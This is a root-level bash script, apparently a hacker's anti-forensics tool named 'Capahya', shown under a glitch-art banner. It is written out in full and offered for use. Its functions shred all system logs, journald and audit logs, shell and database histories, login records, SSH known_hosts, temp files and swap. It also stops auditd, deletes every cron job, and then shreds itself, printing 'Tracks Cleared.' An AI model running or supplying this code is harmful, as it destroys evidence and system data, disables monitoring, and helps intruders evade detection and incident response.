#!/bin/bash

RED="\e[31m"
ENDCOLOR="\e[0m"

echo -e """${RED}
                                                                     
 @@@@@@@   @@@@@@   @@@@@@@    @@@@@@   @@@  @@@  @@@ @@@   @@@@@@   
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@ @@@  @@@@@@@@  
!@@       @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@! !@@  @@!  @@@  
!@!       !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@! @!!  !@!  @!@  
!@!       @!@!@!@!  @!@@!@!   @!@!@!@!  @!@!@!@!   !@!@!   @!@!@!@!  
!!!       !!!@!!!!  !!@!!!    !!!@!!!!  !!!@!!!!    @!!!   !!!@!!!!  
:!!       !!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  
:!:       :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  
 ::: :::  ::   :::   ::       ::   :::  ::   :::     ::    ::   :::  
 :: :: :   :   : :   :         :   : :   :   : :     :      :   : :  ${ENDCOLOR}"""

echo -e "                        "

# --- Setup ---
CLEAR_LINE="\033[2K"
CARRIAGE_RETURN="\r"
RESET="\033[0m"
SLEEP_TIME=0.07

# Symbols to swap in 
GLITCH_CHARS=( "~" "@" "#" "%" "^" "&" "*" "." "\"" "\\" "/" "|" "+" "=" "?" )

# Function to replace a character in a string
replace_char() {
    local str="$1"
    local idx="$2"
    local new_char="$3"
    echo "${str:0:$idx}${new_char}${str:$((idx+1))}"
}

#RUSSIAN GLITCH
russian="       словно саранча, они опустошают землю и затем улетают"
echo -ne "$russian"
sleep 1

for i in {1..5}; do
    echo -ne "${CARRIAGE_RETURN}${CLEAR_LINE}"
    sleep $SLEEP_TIME
    echo -ne "$russian"
    sleep $SLEEP_TIME
done

echo -ne "${CARRIAGE_RETURN}${CLEAR_LINE}"
sleep 0.3

#ENGLISH GLITCH
english="       like locusts they strip the land and then fly away"
echo -ne "$english"
sleep 1.5

#GLITCH 'N BURN
current="$english"
length=${#english}
glitch_count=${#GLITCH_CHARS[@]}

#Make sure glitch !=0
if [[ $glitch_count -eq 0 ]]; then
  echo -e "\nError: GLITCH_CHARS is empty!"
  exit 1
fi

# Loop: corrupt from left to right
for (( i=0; i<length; i++ )); do
    if [[ "${current:$i:1}" != " " ]]; then
        rand_char="${GLITCH_CHARS[$RANDOM % glitch_count]}"
        current=$(replace_char "$current" $i "$rand_char")
    fi
    # Randomly corrupt other characters 
    for (( j=0; j<length; j++ )); do
        if [[ "${current:$j:1}" != " " && $((RANDOM % 10)) -lt 2 ]]; then
            rand_char="${GLITCH_CHARS[$RANDOM % glitch_count]}"
            current=$(replace_char "$current" $j "$rand_char")
        fi
    done
    echo -ne "${CARRIAGE_RETURN}${current}"
    sleep 0.05
done

# Final chaos
for i in {1..6}; do
    final_line=""
    for (( k=0; k<length; k++ )); do
        if [[ "${english:$k:1}" == " " ]]; then
            final_line+=" "
        else
            final_line+="${GLITCH_CHARS[$RANDOM % glitch_count]}"
        fi
    done
    echo -ne "${CARRIAGE_RETURN}${final_line}"
    sleep 0.05
done

# Final erase
sleep 0.2
echo -ne "${CARRIAGE_RETURN}${CLEAR_LINE}"

echo -e " Operational security tool for controlled environment sanitization."
echo -e "                     Developed by: deadnomadZ                      "



##########################
# PRE-CHECKS & CONSTANTS #
##########################

if [[ $EUID -ne 0 ]]; then
  echo "[!] Run as root (sudo)"
  exit 1
fi

LOG_DIRS=(
  "/var/log"
  "/var/log/audit"
  "/var/log/apache2"
  "/var/log/httpd"
  "/var/log/nginx"
  "/var/log/mysql"
)

BASH_HIST_FILES=(
  "$HOME/.bash_history"
  "/root/.bash_history"
)

##########################
# FUNCTION DEFINITIONS   #
##########################

function clear_sys_logs() {
  echo "[*] Targeting system logs..."
  for dir in "${LOG_DIRS[@]}"; do
    if [[ -d "$dir" ]]; then
      find "$dir" -type f -exec shred -u -z -n 3 {} \; 2>/dev/null
      echo "  [+] Cleared: $dir"
    fi
  done
}

function clear_journalctl() {
  echo "[*] Journal logs..."
  journalctl --rotate
  journalctl --vacuum-time=1s
  journalctl --vacuum-size=1M
  echo "  [+] journalctl logs cleared"
}

function clear_bash_history() {
  echo "[*] Bash history..."
  for hist in "${BASH_HIST_FILES[@]}"; do
    if [[ -f "$hist" ]]; then
      shred -u -z -n 3 "$hist"
      echo "  [+] Shredded: $hist"
    fi
  done
  export HISTFILE=
  unset HISTFILE
  history -c
  echo "  [+] In-memory history cleared"
}

function clear_auditd() {
  echo "[*] Audit logs..."
  audit_log="/var/log/audit/audit.log"
  if [[ -f "$audit_log" ]]; then
    truncate -s 0 "$audit_log"
    echo "  [+] audit.log truncated"
  fi
  systemctl stop auditd.service 2>/dev/null
  echo "  [+] auditd stopped"
}

function remove_ssh_fingerprints() {
  echo "[*] Removing known SSH fingerprints..."
  shred -u -z -n 3 "$HOME/.ssh/known_hosts" 2>/dev/null
  shred -u -z -n 3 "/root/.ssh/known_hosts" 2>/dev/null
  echo "  [+] known_hosts removed"
}

function remove_tmp_files() {
  echo "[*] Clearing /tmp and /var/tmp..."
  find /tmp -type f -exec shred -u -z -n 1 {} \; 2>/dev/null
  find /var/tmp -type f -exec shred -u -z -n 1 {} \; 2>/dev/null
  echo "  [+] Temporary files shredded"
}

function clear_user_logs() {
  echo "[*] Clearing user logs..."
  echo "~/.zsh_history"
  echo "~/.mysql_history"
  echo "~/.sqlite_history"
  echo "~/.python"



  shred -u -z -n 1 ~/.zsh_history 2>/dev/null
  shred -u -z -n 1 ~/.mysql_history 2>/dev/null
  shred -u -z -n 1 ~/.sqlite_history 2>/dev/null
  shred -u -z -n 1 ~/.python_history 2>/dev/null
  echo "  [+] User-level histories cleared"
}

function clean_cron_jobs() {
  echo "[*] Cleaning up cron jobs..."
  crontab -r 2>/dev/null
  rm -f /etc/cron.d/*
  rm -f /var/spool/cron/crontabs/*
  echo "  [+] Crontabs cleared"
}

function clear_login_logs() {
  echo "[*] Clearing login records..."
  > /var/log/wtmp
  > /var/log/btmp
  > /var/log/lastlog
  > /var/log/faillog
  echo "  [+] Login history wiped"
}

function wipe_swap() {
  echo "[*] Wiping swap space..."
  swap_dev=$(swapon --show=NAME --noheadings)
  if [[ ! -z "$swap_dev" ]]; then
    swapoff "$swap_dev"
    shred -n 1 -z "$swap_dev"
    mkswap "$swap_dev"
    swapon "$swap_dev"
    echo "  [+] Swap wiped and re-enabled"
  else
    echo "  [-] No swap space found"
  fi
}

function remove_script_self() {
  echo "[*] Self-destructing script..."
  echo "3..."
  echo "2..."
  echo "1..."
  shred -u -z -n 3 "$0"
  echo "  [+] Script removed"
}

##########################
# EXECUTION SEQUENCE     #
##########################

clear_sys_logs
clear_journalctl
clear_bash_history
clear_auditd
remove_ssh_fingerprints
remove_tmp_files
clear_user_logs
clean_cron_jobs
clear_login_logs
wipe_swap
remove_script_self

echo "[✔] Tracks Cleared."


